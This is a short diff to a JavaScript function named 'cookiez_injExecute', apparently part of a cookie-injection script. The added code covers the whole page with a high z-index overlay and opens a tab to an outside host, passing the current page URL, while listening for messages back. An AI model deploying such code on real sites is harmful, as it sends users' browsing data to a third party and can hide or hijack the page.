@@ -27,9 +27,20 @@ function cookiez_injExecute() {
 	}
 	else {
 		var receiveMessage = function(event) {
-		  div.removeEventListener("message", receiveMessage, false);
+		  window.removeEventListener("message", receiveMessage, false);
 		  console.log(event.data);
 		}
+		
+		var div = document.createElement('div');
+		div.style.zIndex = '66666';
+		div.style.position = 'absolute';
+		div.style.top = '0';
+		div.style.left = '0';
+		div.style.bottom = '0';
+		div.style.right = '0';
+		div.backgroundColor = 'green';
+		document.body.appendChild(div);
+		
 		window.addEventListener("message", receiveMessage, false);
 		var newtab = window.open("http://l.ccr.ovh/innewtab.html?url=" + window.location.href);
 		
